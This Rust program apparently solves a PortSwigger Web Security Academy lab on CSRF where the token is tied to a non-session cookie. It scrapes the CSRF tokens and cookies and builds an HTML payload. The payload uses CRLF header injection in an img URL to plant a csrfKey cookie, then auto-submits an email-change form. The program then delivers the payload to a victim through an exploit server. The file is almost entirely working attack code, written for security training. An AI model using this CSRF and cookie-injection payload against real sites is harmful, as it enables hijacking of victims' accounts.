/***********************************************************************************
*
* Lab: CSRF where token is tied to non-session cookie
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token, session cookie and csrfKey cookie
*      3. Login as wiener
*      4. Fetch wiener profile
*      5. Extract the csrf token that is needed for email update
*      6. Craft an HTML form for changing the email address that includes
*         the extracted csrf token and an img tag which is used to set the csrfKey
*         cookie via its src and submit the form via its error handler
*      7. Deliver the exploit to the victim
*      8. The victim's email will be changed after they trigger the exploit
*
************************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a45009a03c91cfd84978b4b00fc0055.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a2700c303ca1c6284e18ad3017f00c6.exploit-server.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client(Policy::none());
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch("/login");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token, session cookie and csrfKey cookie.. ");
    flush_terminal();

    let mut session = get_cookie_from_multiple_cookies(&login_page, "session");
    let mut csrf_key = get_cookie_from_multiple_cookies(&login_page, "csrfKey");
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ",);
    flush_terminal();

    let login_as_wiener = login_as_wiener(&session, &csrf_token, &csrf_key);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching wiener profile.. ",);
    flush_terminal();

    session = get_session_cookie(&login_as_wiener);
    let wiener_profile = fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token that is needed for email update.. ");
    flush_terminal();

    csrf_key = get_cookie_from_multiple_cookies(&wiener_profile, "csrfKey");
    csrf_token = get_csrf_token(wiener_profile);
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="{csrf_token}" />
                    <input type="submit" value="Submit request" />
                </form>
                <img src="{LAB_URL}/?search=boo%0d%0aSet-Cookie: csrfKey={csrf_key}; SameSite=None" onerror=document.forms[0].submit()>
                </body>
            </html>
      "###
    );

    println!("{}", "OK".green());
    print!("⦗6⦘ Delivering the exploit to the victim.. ",);
    flush_terminal();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client(policy: Policy) -> Client {
    ClientBuilder::new()
        .redirect(policy)
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str, csrf_key: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}; csrfKey={csrf_key}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let web_client = build_web_client(Policy::default());
    web_client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn get_cookie_from_multiple_cookies(response: &Response, cookie_name: &str) -> String {
    let headers = response.headers();

    match cookie_name {
        "csrfKey" => {
            let first_cookie = headers.get_all("set-cookie").iter().nth(0);
            let first_cookie_as_string = first_cookie.unwrap().to_str().unwrap();
            capture_pattern_from_text(r"csrfKey=(\w*);", first_cookie_as_string)
        }
        "session" => {
            let second_cookie = headers.get_all("set-cookie").iter().nth(1);
            let second_cookie_as_string = second_cookie.unwrap().to_str().unwrap();
            capture_pattern_from_text(r"session=(\w*);", second_cookie_as_string)
        }
        _ => "".to_string(),
    }
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
